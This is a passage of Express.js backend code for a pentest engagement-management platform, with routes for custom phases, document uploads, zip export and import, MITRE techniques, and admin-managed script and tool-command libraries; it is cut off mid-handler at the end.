app.delete("/api/api-keys/:id", auth(), async (req, res) => {
  const k = await qRow("SELECT id,user_id FROM api_keys WHERE id=?", [req.params.id]);
  if (!k) return res.status(404).json({ error: "No encontrado" });
  // Solo admin o el owner pueden revocar
  if (k.user_id !== req.user.id && req.user.role !== 'admin') return res.status(403).json({ error: "Sin permiso" });
  await qRun("DELETE FROM api_keys WHERE id=?", [req.params.id]);
  res.json({ ok: true });
});

// Admin puede ver todas las API keys
app.get("/api/api-keys/all", auth(["admin"]), async (req, res) => {
  const keys = await qRows(
    `SELECT ak.id,ak.name,ak.key_prefix,ak.permissions,ak.last_used,ak.expires_at,ak.is_active,ak.created_at,
            u.username,u.full_name
     FROM api_keys ak JOIN users u ON u.id=ak.user_id ORDER BY ak.created_at DESC`
  );
  res.json(keys);
});

// ── Custom Phases ─────────────────────────────────────────────────────────────
const docUpload = multer({ dest: UPLOADS_DIR, limits: { fileSize: 100 * 1024 * 1024 } });

// List phases
app.get("/api/engagements/:id/custom-phases", auth(), async (req, res) => {
  const eng = await qRow("SELECT id,mode FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "No encontrado" });
  const phases = await qRows(
    "SELECT cp.*, u.full_name AS author_name, " +
    "(SELECT COUNT(*) FROM custom_phase_docs d WHERE d.phase_id=cp.id) AS docs_count, " +
    "(SELECT COUNT(*) FROM custom_phase_updates u2 WHERE u2.phase_id=cp.id) AS updates_count " +
    "FROM custom_phases cp LEFT JOIN users u ON u.id=cp.created_by " +
    "WHERE cp.engagement_id=? ORDER BY cp.order_index ASC, cp.created_at ASC",
    [req.params.id]
  );
  res.json(phases);
});

// Create phase
app.post("/api/engagements/:id/custom-phases", auth(["admin","auditor","pentester"]), async (req, res) => {
  const eng = await qRow("SELECT id FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "No encontrado" });
  const { name, description, order_index } = req.body;
  if (!name?.trim()) return res.status(400).json({ error: "El nombre de la fase es requerido" });
  const maxOrder = await qRow("SELECT MAX(order_index) AS m FROM custom_phases WHERE engagement_id=?", [req.params.id]);
  const idx = order_index != null ? order_index : ((maxOrder?.m ?? -1) + 1);
  const id = uuidv4();
  await qRun(
    "INSERT INTO custom_phases (id,engagement_id,name,description,order_index,created_by) VALUES (?,?,?,?,?,?)",
    [id, req.params.id, name.trim(), description||null, idx, req.user.id]
  );
  res.status(201).json(await qRow("SELECT * FROM custom_phases WHERE id=?", [id]));
});

// Update phase
app.put("/api/engagements/:id/custom-phases/:phaseId", auth(["admin","auditor","pentester"]), async (req, res) => {
  const phase = await qRow("SELECT id FROM custom_phases WHERE id=? AND engagement_id=?", [req.params.phaseId, req.params.id]);
  if (!phase) return res.status(404).json({ error: "Fase no encontrada" });
  const { name, description, work_plan, status, order_index } = req.body;
  await qRun(
    "UPDATE custom_phases SET name=COALESCE(?,name), description=COALESCE(?,description), work_plan=COALESCE(?,work_plan), status=COALESCE(?,status), order_index=COALESCE(?,order_index) WHERE id=?",
    [name||null, description||null, work_plan!==undefined?work_plan:null, status||null, order_index!=null?order_index:null, req.params.phaseId]
  );
  res.json(await qRow("SELECT * FROM custom_phases WHERE id=?", [req.params.phaseId]));
});

// Delete phase
app.delete("/api/engagements/:id/custom-phases/:phaseId", auth(["admin","auditor"]), async (req, res) => {
  const phase = await qRow("SELECT id FROM custom_phases WHERE id=? AND engagement_id=?", [req.params.phaseId, req.params.id]);
  if (!phase) return res.status(404).json({ error: "Fase no encontrada" });
  // Delete docs files from disk
  const docs = await qRows("SELECT filename FROM custom_phase_docs WHERE phase_id=?", [req.params.phaseId]);
  for (const d of docs) {
    try { fs.unlinkSync(path.join(UPLOADS_DIR, d.filename)); } catch {}
  }
  await qRun("DELETE FROM custom_phases WHERE id=?", [req.params.phaseId]);
  res.json({ ok: true });
});

// ── Custom Phase Documents ────────────────────────────────────────────────────
app.get("/api/engagements/:id/custom-phases/:phaseId/documents", auth(), async (req, res) => {
  const phase = await qRow("SELECT id FROM custom_phases WHERE id=? AND engagement_id=?", [req.params.phaseId, req.params.id]);
  if (!phase) return res.status(404).json({ error: "Fase no encontrada" });
  const docs = await qRows(
    "SELECT d.*, u.full_name AS uploader_name FROM custom_phase_docs d LEFT JOIN users u ON u.id=d.uploaded_by WHERE d.phase_id=? ORDER BY d.uploaded_at DESC",
    [req.params.phaseId]
  );
  res.json(docs);
});

app.post("/api/engagements/:id/custom-phases/:phaseId/documents", auth(["admin","auditor","pentester"]), docUpload.single("file"), async (req, res) => {
  const phase = await qRow("SELECT id FROM custom_phases WHERE id=? AND engagement_id=?", [req.params.phaseId, req.params.id]);
  if (!phase) return res.status(404).json({ error: "Fase no encontrada" });
  if (!req.file) return res.status(400).json({ error: "No se recibió archivo" });
  const did = uuidv4();
  await qRun(
    "INSERT INTO custom_phase_docs (id,phase_id,engagement_id,filename,original_name,file_type,file_size,caption,uploaded_by) VALUES (?,?,?,?,?,?,?,?,?)",
    [did, req.params.phaseId, req.params.id, req.file.filename, req.file.originalname, req.file.mimetype, req.file.size, req.body.caption||null, req.user.id]
  );
  res.status(201).json(await qRow("SELECT * FROM custom_phase_docs WHERE id=?", [did]));
});

app.get("/api/engagements/:id/custom-phases/:phaseId/documents/:docId/download", auth(), async (req, res) => {
  const doc = await qRow("SELECT * FROM custom_phase_docs WHERE id=? AND phase_id=?", [req.params.docId, req.params.phaseId]);
  if (!doc) return res.status(404).json({ error: "Documento no encontrado" });
  const filePath = path.join(UPLOADS_DIR, doc.filename);
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "Archivo no encontrado en disco" });
  res.download(filePath, doc.original_name);
});

app.delete("/api/engagements/:id/custom-phases/:phaseId/documents/:docId", auth(["admin","auditor","pentester"]), async (req, res) => {
  const doc = await qRow("SELECT * FROM custom_phase_docs WHERE id=? AND phase_id=?", [req.params.docId, req.params.phaseId]);
  if (!doc) return res.status(404).json({ error: "Documento no encontrado" });
  try { fs.unlinkSync(path.join(UPLOADS_DIR, doc.filename)); } catch {}
  await qRun("DELETE FROM custom_phase_docs WHERE id=?", [req.params.docId]);
  res.json({ ok: true });
});

// ── Custom Phase Updates (activity feed) ─────────────────────────────────────
app.get("/api/engagements/:id/custom-phases/:phaseId/updates", auth(), async (req, res) => {
  const phase = await qRow("SELECT id FROM custom_phases WHERE id=? AND engagement_id=?", [req.params.phaseId, req.params.id]);
  if (!phase) return res.status(404).json({ error: "Fase no encontrada" });
  const updates = await qRows(
    "SELECT u.*, usr.full_name AS author_name FROM custom_phase_updates u LEFT JOIN users usr ON usr.id=u.created_by WHERE u.phase_id=? ORDER BY u.created_at DESC",
    [req.params.phaseId]
  );
  // Adjuntar imágenes a cada actualización
  for (const upd of updates) {
    upd.images = await qRows(
      "SELECT * FROM custom_phase_update_images WHERE update_id=? ORDER BY uploaded_at",
      [upd.id]
    );
  }
  res.json(updates);
});

app.post("/api/engagements/:id/custom-phases/:phaseId/updates", auth(["admin","auditor","pentester"]), async (req, res) => {
  const phase = await qRow("SELECT id FROM custom_phases WHERE id=? AND engagement_id=?", [req.params.phaseId, req.params.id]);
  if (!phase) return res.status(404).json({ error: "Fase no encontrada" });
  const { content } = req.body;
  if (!content?.trim()) return res.status(400).json({ error: "El contenido no puede estar vacío" });
  const uid = uuidv4();
  await qRun(
    "INSERT INTO custom_phase_updates (id,phase_id,content,created_by) VALUES (?,?,?,?)",
    [uid, req.params.phaseId, content.trim(), req.user.id]
  );
  res.status(201).json(await qRow(
    "SELECT u.*, usr.full_name AS author_name FROM custom_phase_updates u LEFT JOIN users usr ON usr.id=u.created_by WHERE u.id=?",
    [uid]
  ));
});

app.delete("/api/engagements/:id/custom-phases/:phaseId/updates/:updateId", auth(["admin","auditor"]), async (req, res) => {
  // Borrar imágenes asociadas primero
  const imgs = await qRows("SELECT filename FROM custom_phase_update_images WHERE update_id=?", [req.params.updateId]);
  for (const img of imgs) {
    const fp = path.join(UPLOADS_DIR, img.filename);
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  }
  await qRun("DELETE FROM custom_phase_updates WHERE id=? AND phase_id=?", [req.params.updateId, req.params.phaseId]);
  res.json({ ok: true });
});

// ── Imágenes de actualizaciones ───────────────────────────────────────────────
app.post("/api/engagements/:id/custom-phases/:phaseId/updates/:updateId/images",
  auth(["admin","auditor","pentester"]), docUpload.single("file"), async (req, res) => {
  const update = await qRow(
    "SELECT u.id FROM custom_phase_updates u WHERE u.id=? AND u.phase_id=?",
    [req.params.updateId, req.params.phaseId]
  );
  if (!update) return res.status(404).json({ error: "Actualización no encontrada" });
  if (!req.file) return res.status(400).json({ error: "No se recibió ningún archivo" });
  const uid = uuidv4();
  await qRun(
    "INSERT INTO custom_phase_update_images (id,update_id,filename,original_name,file_size) VALUES (?,?,?,?,?)",
    [uid, req.params.updateId, req.file.filename, req.file.originalname, req.file.size]
  );
  res.status(201).json(await qRow("SELECT * FROM custom_phase_update_images WHERE id=?", [uid]));
});

app.delete("/api/engagements/:id/custom-phases/:phaseId/updates/:updateId/images/:imageId",
  auth(["admin","auditor","pentester"]), async (req, res) => {
  const img = await qRow(
    "SELECT filename FROM custom_phase_update_images WHERE id=? AND update_id=?",
    [req.params.imageId, req.params.updateId]
  );
  if (img) {
    const fp = path.join(UPLOADS_DIR, img.filename);
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
    await qRun("DELETE FROM custom_phase_update_images WHERE id=?", [req.params.imageId]);
  }
  res.json({ ok: true });
});

// ── Export / Import de engagements ───────────────────────────────────────────

app.get("/api/engagements/:id/export", auth(), async (req, res) => {
  try {
    const eng = await qRow(
      "SELECT e.*, c.name AS client_name FROM engagements e JOIN clients c ON c.id=e.client_id WHERE e.id=?",
      [req.params.id]
    );
    if (!eng) return res.status(404).json({ error: "Engagement no encontrado" });
    const eid = eng.id;
    const [scope, findings, logs, evidences, customPhases] = await Promise.all([
      qRows("SELECT * FROM scope_items WHERE engagement_id=?", [eid]),
      qRows("SELECT * FROM findings WHERE engagement_id=? ORDER BY created_at", [eid]),
      qRows("SELECT * FROM operation_logs WHERE engagement_id=? ORDER BY logged_at", [eid]),
      qRows("SELECT * FROM evidences WHERE engagement_id=? ORDER BY uploaded_at", [eid]),
      qRows("SELECT * FROM custom_phases WHERE engagement_id=? ORDER BY order_index", [eid]),
    ]);
    const phaseDocs = [], updates = [], updateImgs = [];
    for (const ph of customPhases) {
      const docs = await qRows("SELECT * FROM custom_phase_docs WHERE phase_id=?", [ph.id]);
      phaseDocs.push(...docs);
      const upds = await qRows("SELECT * FROM custom_phase_updates WHERE phase_id=? ORDER BY created_at", [ph.id]);
      for (const u of upds) {
        const imgs = await qRows("SELECT * FROM custom_phase_update_images WHERE update_id=?", [u.id]);
        updateImgs.push(...imgs);
      }
      updates.push(...upds);
    }
    const manifest = {
      version: "1.0", exported_at: new Date().toISOString(), exported_by: req.user.username,
      engagement: eng, scope, findings,
      operation_logs: logs,
      evidences: evidences.map(e => ({ ...e, zip_path: `files/${e.filename}` })),
      custom_phases: customPhases,
      phase_docs: phaseDocs.map(d => ({ ...d, zip_path: `files/${d.filename}` })),
      phase_updates: updates,
      phase_update_images: updateImgs.map(i => ({ ...i, zip_path: `files/${i.filename}` })),
    };
    const zip = new AdmZip();
    zip.addFile("engagement.json", Buffer.from(JSON.stringify(manifest, null, 2), "utf8"));
    for (const f of [
      ...evidences.map(e => ({ filename: e.filename })),
      ...phaseDocs.map(d => ({ filename: d.filename })),
      ...updateImgs.map(i => ({ filename: i.filename })),
    ]) {
      const fp = path.join(UPLOADS_DIR, f.filename);
      if (fs.existsSync(fp)) zip.addLocalFile(fp, "files", f.filename);
    }
    const zipBuffer = zip.toBuffer();
    const safeName = (eng.codename || eng.title).replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 60);
    const zipName  = `gungnir-${safeName}-${new Date().toISOString().slice(0, 10)}.zip`;
    res.set({ "Content-Type": "application/zip", "Content-Disposition": `attachment; filename="${zipName}"`, "Content-Length": zipBuffer.length });
    res.send(zipBuffer);
  } catch (e) { console.error("Export error:", e); res.status(500).json({ error: "Error al generar el export" }); }
});

const importUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 * 1024 } });

app.post("/api/engagements/import", auth(["admin","auditor"]), importUpload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No se recibió ningún archivo" });
  if (!req.file.originalname.endsWith(".zip")) return res.status(400).json({ error: "El archivo debe ser un .zip" });
  try {
    const zip = new AdmZip(req.file.buffer);
    const manifestEntry = zip.getEntry("engagement.json");
    if (!manifestEntry) return res.status(400).json({ error: "ZIP inválido: falta engagement.json" });
    const manifest = JSON.parse(manifestEntry.getData().toString("utf8"));
    if (!manifest.version || !manifest.engagement) return res.status(400).json({ error: "engagement.json inválido" });
    const src = manifest.engagement;
    const newEngId = uuidv4();
    let clientId = null;
    if (src.client_id) {
      const existing = await qRow("SELECT id FROM clients WHERE id=?", [src.client_id]);
      if (existing) { clientId = src.client_id; }
      else if (src.client_name) {
        const byName = await qRow("SELECT id FROM clients WHERE name=?", [src.client_name]);
        if (byName) { clientId = byName.id; }
        else { clientId = uuidv4(); await qRun("INSERT INTO clients (id, name, created_by) VALUES (?,?,?)", [clientId, src.client_name, req.user.id]); }
      }
    }
    if (!clientId) return res.status(400).json({ error: "No se pudo resolver el cliente" });
    await qRun(
      `INSERT INTO engagements (id,client_id,title,codename,type,methodology,mode,status,current_phase,start_date,end_date,rules_of_engagement,notes,created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      [newEngId, clientId, `${src.title} (importado)`, src.codename||null, src.type||"web_app", src.methodology||"ptes", src.mode||"pentesting", "planned", src.current_phase||"planning", src.start_date||null, src.end_date||null, src.rules_of_engagement||null, src.notes||null, req.user.id]
    );
    const fileMap = {};
    for (const entry of zip.getEntries().filter(e => e.entryName.startsWith("files/") && !e.isDirectory)) {
      const oldFn = entry.entryName.replace("files/", "");
      const newFn = uuidv4();
      fs.writeFileSync(path.join(UPLOADS_DIR, newFn), entry.getData());
      fileMap[oldFn] = newFn;
    }
    for (const s of (manifest.scope || [])) {
      await qRun("INSERT INTO scope_items (id,engagement_id,type,value,in_scope,notes) VALUES (?,?,?,?,?,?)", [uuidv4(), newEngId, s.type, s.value, s.in_scope??1, s.notes||null]);
    }
    const findingIdMap = {};
    for (const f of (manifest.findings || [])) {
      const newFid = uuidv4(); findingIdMap[f.id] = newFid;
      await qRun(
        `INSERT INTO findings (id,engagement_id,phase_type,title,severity,business_risk,exploitability,status,owasp_category,owasp_year,description,steps_to_reproduce,affected_asset,recommendation,executive_summary,cvss_score_31,created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
        [newFid, newEngId, f.phase_type||null, f.title, f.severity||"medium", f.business_risk||null, f.exploitability||null, "open", f.owasp_category||null, f.owasp_year||null, f.description||null, f.steps_to_reproduce||null, f.affected_asset||null, f.recommendation||null, f.executive_summary||null, f.cvss_score_31||null, req.user.id]
      );
    }
    for (const l of (manifest.operation_logs || [])) {
      await qRun("INSERT INTO operation_logs (id,engagement_id,phase_type,tool,command,target,notes,created_by) VALUES (?,?,?,?,?,?,?,?)", [uuidv4(), newEngId, l.phase_type||null, l.tool||null, l.command||null, l.target||null, l.notes||null, req.user.id]);
    }
    for (const e of (manifest.evidences || [])) {
      const newFn = fileMap[e.filename]; if (!newFn) continue;
      await qRun("INSERT INTO evidences (id,engagement_id,finding_id,phase_type,filename,original_name,file_type,file_size,caption,uploaded_by) VALUES (?,?,?,?,?,?,?,?,?,?)", [uuidv4(), newEngId, findingIdMap[e.finding_id]||null, e.phase_type||null, newFn, e.original_name, e.file_type, e.file_size, e.caption||null, req.user.id]);
    }
    const phaseIdMap = {};
    for (const ph of (manifest.custom_phases || [])) {
      const newPhId = uuidv4(); phaseIdMap[ph.id] = newPhId;
      await qRun("INSERT INTO custom_phases (id,engagement_id,name,description,work_plan,status,order_index,created_by) VALUES (?,?,?,?,?,?,?,?)", [newPhId, newEngId, ph.name, ph.description||null, ph.work_plan||null, ph.status||"not_started", ph.order_index||0, req.user.id]);
    }
    for (const d of (manifest.phase_docs || [])) {
      const newFn = fileMap[d.filename]; if (!newFn || !phaseIdMap[d.phase_id]) continue;
      await qRun("INSERT INTO custom_phase_docs (id,phase_id,engagement_id,filename,original_name,file_type,file_size,caption,uploaded_by) VALUES (?,?,?,?,?,?,?,?,?)", [uuidv4(), phaseIdMap[d.phase_id], newEngId, newFn, d.original_name, d.file_type, d.file_size, d.caption||null, req.user.id]);
    }
    const updateIdMap = {};
    for (const u of (manifest.phase_updates || [])) {
      if (!phaseIdMap[u.phase_id]) continue;
      const newUid = uuidv4(); updateIdMap[u.id] = newUid;
      await qRun("INSERT INTO custom_phase_updates (id,phase_id,content,author_name,created_by) VALUES (?,?,?,?,?)", [newUid, phaseIdMap[u.phase_id], u.content, u.author_name||req.user.username, req.user.id]);
    }
    for (const i of (manifest.phase_update_images || [])) {
      const newFn = fileMap[i.filename]; if (!newFn || !updateIdMap[i.update_id]) continue;
      await qRun("INSERT INTO custom_phase_update_images (id,update_id,filename,original_name,file_size) VALUES (?,?,?,?,?)", [uuidv4(), updateIdMap[i.update_id], newFn, i.original_name, i.file_size]);
    }
    const imported = await qRow("SELECT e.*, c.name AS client_name FROM engagements e JOIN clients c ON c.id=e.client_id WHERE e.id=?", [newEngId]);
    res.status(201).json({ ok: true, engagement: imported });
  } catch (e) { console.error("Import error:", e); res.status(500).json({ error: `Error al importar: ${e.message}` }); }
});

// ── Técnicas del engagement ───────────────────────────────────────────────────
app.get("/api/engagements/:id/techniques", auth(), async (req, res) => {
  const rows = await qRows(
    "SELECT et.*, usr.full_name AS added_by_name FROM engagement_techniques et LEFT JOIN users usr ON usr.id=et.added_by WHERE et.engagement_id=? ORDER BY et.added_at DESC",
    [req.params.id]
  );
  res.json(rows);
});

app.post("/api/engagements/:id/techniques", auth(["admin","auditor","pentester"]), async (req, res) => {
  const { mitre_id, name, tactic, tool, notes, custom_phase_id, phase_type } = req.body;
  if (!name?.trim()) return res.status(400).json({ error: "El nombre es requerido" });
  const uid = uuidv4();
  await qRun(
    "INSERT INTO engagement_techniques (id,engagement_id,custom_phase_id,phase_type,mitre_id,name,tactic,tool,notes,added_by) VALUES (?,?,?,?,?,?,?,?,?,?)",
    [uid, req.params.id, custom_phase_id||null, phase_type||null, mitre_id||null, name.trim(), tactic||null, tool||null, notes||null, req.user.id]
  );
  res.status(201).json(await qRow("SELECT * FROM engagement_techniques WHERE id=?", [uid]));
});

app.delete("/api/engagements/:id/techniques/:techId", auth(["admin","auditor","pentester"]), async (req, res) => {
  await qRun("DELETE FROM engagement_techniques WHERE id=? AND engagement_id=?", [req.params.techId, req.params.id]);
  res.json({ ok: true });
});

// ── STATIC (producción) ───────────────────────────────────────────────────────
const DIST = path.join(__dirname, "..", "frontend-shadcn", "dist");
// ── Scripts custom ───────────────────────────────────────────────────────────
const parseScriptRow = r => ({
  ...r,
  mitre_ids:     r.mitre_ids     ? JSON.parse(r.mitre_ids)     : [],
  related_tools: r.related_tools ? JSON.parse(r.related_tools) : [],
  tags:          r.tags          ? JSON.parse(r.tags)          : [],
});

app.get("/api/scripts", auth(), async (req, res) => {
  const rows = await qRows("SELECT s.*, u.full_name AS author_name FROM scripts s LEFT JOIN users u ON u.id=s.created_by ORDER BY s.category, s.name");
  res.json(rows.map(parseScriptRow));
});

app.post("/api/scripts", auth(["admin"]), async (req, res) => {
  const { name, description, category, platform, language, content, mitre_ids, related_tools, tags, notes, severity, script_type } = req.body;
  if (!name?.trim() || !content?.trim()) return res.status(400).json({ error: "name y content son requeridos" });
  const id = uuidv4();
  await qRun(
    "INSERT INTO scripts (id,name,description,category,platform,language,content,mitre_ids,related_tools,tags,notes,severity,script_type,created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
    [id, name.trim(), description?.trim()||null, category?.trim()||'General',
     platform||'linux', language||'bash', content.trim(),
     JSON.stringify(mitre_ids||[]), JSON.stringify(related_tools||[]), JSON.stringify(tags||[]),
     notes?.trim()||null, severity||'info', script_type||'detection', req.user.id]
  );
  await logAudit(req.user.id, req.user.username, 'create', 'script', id, `Script: ${name}`, req.ip);
  const row = await qRow("SELECT s.*, u.full_name AS author_name FROM scripts s LEFT JOIN users u ON u.id=s.created_by WHERE s.id=?", [id]);
  res.status(201).json(parseScriptRow(row));
});

app.put("/api/scripts/:id", auth(["admin"]), async (req, res) => {
  const s = await qRow("SELECT * FROM scripts WHERE id=?", [req.params.id]);
  if (!s) return res.status(404).json({ error: "No encontrado" });
  const { name, description, category, platform, language, content, mitre_ids, related_tools, tags, notes, severity, script_type } = req.body;
  await qRun(
    "UPDATE scripts SET name=?,description=?,category=?,platform=?,language=?,content=?,mitre_ids=?,related_tools=?,tags=?,notes=?,severity=?,script_type=? WHERE id=?",
    [name?.trim()||s.name, description?.trim()||null, category?.trim()||s.category,
     platform||s.platform, language||s.language, content?.trim()||s.content,
     JSON.stringify(mitre_ids||[]), JSON.stringify(related_tools||[]), JSON.stringify(tags||[]),
     notes?.trim()||null, severity||s.severity, script_type||s.script_type, req.params.id]
  );
  const updated = await qRow("SELECT s.*, u.full_name AS author_name FROM scripts s LEFT JOIN users u ON u.id=s.created_by WHERE s.id=?", [req.params.id]);
  res.json(parseScriptRow(updated));
});

app.delete("/api/scripts/:id", auth(["admin"]), async (req, res) => {
  const s = await qRow("SELECT * FROM scripts WHERE id=?", [req.params.id]);
  if (!s) return res.status(404).json({ error: "No encontrado" });
  await qRun("DELETE FROM scripts WHERE id=?", [req.params.id]);
  await logAudit(req.user.id, req.user.username, 'delete', 'script', req.params.id, `Script: ${s.name}`, req.ip);
  res.json({ ok: true });
});

// ── Arsenal custom ────────────────────────────────────────────────────────────
app.get("/api/arsenal/tools", auth(), async (req, res) => {
  const tools = await qRows("SELECT * FROM arsenal_tools ORDER BY arsenal_cat, label");
  res.json(tools);
});

app.post("/api/arsenal/tools", auth(["admin"]), async (req, res) => {
  const { key_name, label, description, arsenal_cat, kali } = req.body;
  if (!key_name?.trim() || !label?.trim()) return res.status(400).json({ error: "key_name y label son requeridos" });
  // check unique key
  const existing = await qRow("SELECT id FROM arsenal_tools WHERE key_name=?", [key_name.trim()]);
  if (existing) return res.status(409).json({ error: "Ya existe una herramienta con ese key" });
  const id = uuidv4();
  await qRun(
    "INSERT INTO arsenal_tools (id,key_name,label,description,arsenal_cat,kali,created_by) VALUES (?,?,?,?,?,?,?)",
    [id, key_name.trim(), label.trim(), description?.trim()||null, arsenal_cat||'util', kali||'no', req.user.id]
  );
  await logAudit(req.user.id, req.user.username, 'create', 'arsenal_tool', id, `Herramienta: ${label}`, req.ip);
  const tool = await qRow("SELECT * FROM arsenal_tools WHERE id=?", [id]);
  res.status(201).json(tool);
});

app.delete("/api/arsenal/tools/:id", auth(["admin"]), async (req, res) => {
  const tool = await qRow("SELECT * FROM arsenal_tools WHERE id=?", [req.params.id]);
  if (!tool) return res.status(404).json({ error: "No encontrado" });
  await qRun("DELETE FROM arsenal_commands WHERE tool_key=?", [tool.key_name]);
  await qRun("DELETE FROM arsenal_tools WHERE id=?", [req.params.id]);
  await logAudit(req.user.id, req.user.username, 'delete', 'arsenal_tool', req.params.id, `Herramienta: ${tool.label}`, req.ip);
  res.json({ ok: true });
});

app.get("/api/arsenal/commands", auth(), async (req, res) => {
  const cmds = await qRows(
    "SELECT c.*, u.full_name AS author_name FROM arsenal_commands c LEFT JOIN users u ON u.id=c.created_by ORDER BY c.tool_key, c.created_at"
  );
  res.json(cmds.map(c => ({ ...c, tags: c.tags ? JSON.parse(c.tags) : [] })));
});

app.post("/api/arsenal/commands", auth(["admin"]), async (req, res) => {
  const { tool_key, phase, category, title, command, description, tags, notes, mitre_id } = req.body;
  if (!tool_key?.trim() || !title?.trim() || !command?.trim()) return res.status(400).json({ error: "tool_key, title y command son requeridos" });
  const id = uuidv4();
  await qRun(
    "INSERT INTO arsenal_commands (id,tool_key,phase,category,title,command,description,tags,notes,mitre_id,created_by) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
    [id, tool_key.trim(), phase||'general', category?.trim()||'General', title.trim(), command.trim(),
     description?.trim()||null, JSON.stringify(tags||[]), notes?.trim()||null, mitre_id?.trim()||null, req.user.id]
  );
  await logAudit(req.user.id, req.user.username, 'create', 'arsenal_command', id, `Comando: ${title}`, req.ip);
  const cmd = await qRow("SELECT c.*, u.full_name AS author_name FROM arsenal_commands c LEFT JOIN users u ON u.id=c.created_by WHERE c.id=?", [id]);
  res.status(201).json({ ...cmd, tags: cmd.tags ? JSON.parse(cmd.tags) : [] });
});

app.put("/api/arsenal/commands/:id", auth(["admin"]), async (req, res) => {
  const cmd = await qRow("SELECT * FROM arsenal_commands WHERE id=?", [req.params.id]);
  if (!cmd) return res.status(404).json({ error: "No encontrado" });
  const { phase, category, title, command, description, tags, notes, mitre_id } = req.body;
  await qRun(
    "UPDATE arsenal_commands SET phase=?,category=?,title=?,command=?,description=?,tags=?,notes=?,mitre_id=? WHERE id=?",
    [phase||cmd.phase, category?.trim()||cmd.category, title?.trim()||cmd.title, command?.trim()||cmd.command,
     description?.trim()||null, JSON.stringify(tags||[]), notes?.trim()||null, mitre_id?.trim()||null, req.params.id]
  );
  const updated = await qRow("SELECT c.*, u.full_name AS author_name FROM arsenal_commands c LEFT JOIN users u ON u.id=c.created_by WHERE c.id=?", [req.params.id]);
  res.json({ ...updated, tags: updated.tags ? JSON.parse(updated.tags) : [] });
});

app.delete("/api/arsenal/commands/:id", auth(["admin"]), async (req, res) => {
  const cmd = await qRow("SELECT * FROM arsenal_commands WHERE id=?", [req.params.id]);
  if (!cmd) return res.status(404).json({ error: "No encontrado" });
  await qRun("DELETE FROM arsenal_commands WHERE id=?", [req.params.id]);
  await logAudit(req.user.id, req.user.username, 'delete', 'arsenal_command', req.params.id, `Comando: ${cmd.title}`, req.ip);
  res.json({ ok: true });
});

// ── Arsenal command overrides (edit/delete built-ins) ────────────────────────
app.get("/api/arsenal/cmd-overrides", auth(), async (req, res) => {
  const rows = await qRows("SELECT * FROM cmd_overrides");
  res.json(rows.map(r => ({ ...r, tags: r.tags ? JSON.parse(r.tags) : [] })));
});

app.put("/api/arsenal/cmd-overrides/:id", auth(["admin"]), async (req, res) => {
  const { title, command, description, phase, category, tags, notes, mitre_id } = req.body;
  await qRun(
    `INSERT INTO cmd_overrides (item_id,title,command,description,phase,category,tags,notes,mitre_id,hidden,updated_by,updated_at)
     VALUES (?,?,?,?,?,?,?,?,?,0,?,NOW())
     ON DUPLICATE KEY UPDATE title=VALUES(title),command=VALUES(command),description=VALUES(description),
       phase=VALUES(phase),category=VALUES(category),tags=VALUES(tags),notes=VALUES(notes),
       mitre_id=VALUES(mitre_id),hidden=0,updated_by=VALUES(updated_by),updated_at=NOW()`,
    [req.params.id, title?.trim()||null, command?.trim()||null, description?.trim()||null,
     phase||null, category?.trim()||null, JSON.stringify(tags||[]),
     notes?.trim()||null, mitre_id?.trim()||null, req.user.id]
  );
  const row = await qRow("SELECT * FROM cmd_overrides WHERE item_id=?", [req.params.id]);
  await logAudit(req.user.id, req.user.username, 'update', 'cmd_override', req.params.id, `Override cmd: ${req.params.id}`, req.ip);
  res.json({ ...row, tags: row.tags ? JSON.parse(row.tags) : [] });
});

app.delete("/api/arsenal/cmd-overrides/:id", auth(["admin"]), async (req, res) => {
  await qRun(
    `INSERT INTO cmd_overrides (item_id,hidden,updated_by,updated_at) VALUES (?,1,?,NOW())
     ON DUPLICATE KEY UPDATE hidden=1,updated_by=VALUES(updated_by),updated_at=NOW()`,
    [req.params.id, req.user.id]
  );
  await logAudit(req.user.id, req.user.username, 'delete', 'cmd_override', req.params.id, `Ocultar cmd built-in: ${req.params.id}`, req.ip);
  res.json({ ok: true });
});

// ── Script overrides (edit/delete built-ins) ──────────────────────────────────
app.get("/api/scripts/overrides", auth(), async (req, res) => {
  const rows = await qRows("SELECT * FROM script_overrides");
  res.json(rows.map(r => ({
    ...r,
    mitre_ids:     r.mitre_ids     ? JSON.parse(r.mitre_ids)     : [],
    related_tools: r.related_tools ? JSON.parse(r.related_tools) : [],
    tags:          r.tags          ? JSON.parse(r.tags)          : [],
  })));
});

app.put("/api/scripts/overrides/:id", auth(["admin"]), async (req, res) => {
  const { name, description, category, platform, language, content, mitre_ids, related_tools, tags, notes, severity, script_type } = req.body;
  await qRun(
    `INSERT INTO script_overrides (item_id,name,description,category,platform,language,content,mitre_ids,related_tools,tags,notes,severity,script_type,hidden,updated_by,updated_at)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,0,?,NOW())
     ON DUPLICATE KEY UPDATE name=VALUES(name),description=VALUES(description),category=VALUES(category),
       platform=VALUES(platform),language=VALUES(language),content=VALUES(content),
       mitre_ids=VALUES(mitre_ids),related_tools=VALUES(related_tools),tags=VALUES(tags),
       notes=VALUES(notes),severity=VALUES(severity),script_type=VALUES(script_type),
       hidden=0,updated_by=VALUES(updated_by),updated_at=NOW()`,
    [req.params.id, name?.trim()||null, description?.trim()||null, category?.trim()||'General',
     platform||'linux', language||'bash', content?.trim()||null,
     JSON.stringify(mitre_ids||[]), JSON.stringify(related_tools||[]), JSON.stringify(tags||[]),
     notes?.trim()||null, severity||'info', script_type||'detection', req.user.id]
  );
  const row = await qRow("SELECT * FROM script_overrides WHERE item_id=?", [req.params.id]);
  await logAudit(req.user.id, req.user.username, 'update', 'script_override', req.params.id, `Override script: ${req.params.id}`, req.ip);
  res.json({
    ...row,
    mitre_ids:     row.mitre_ids     ? JSON.parse(row.mitre_ids)     : [],
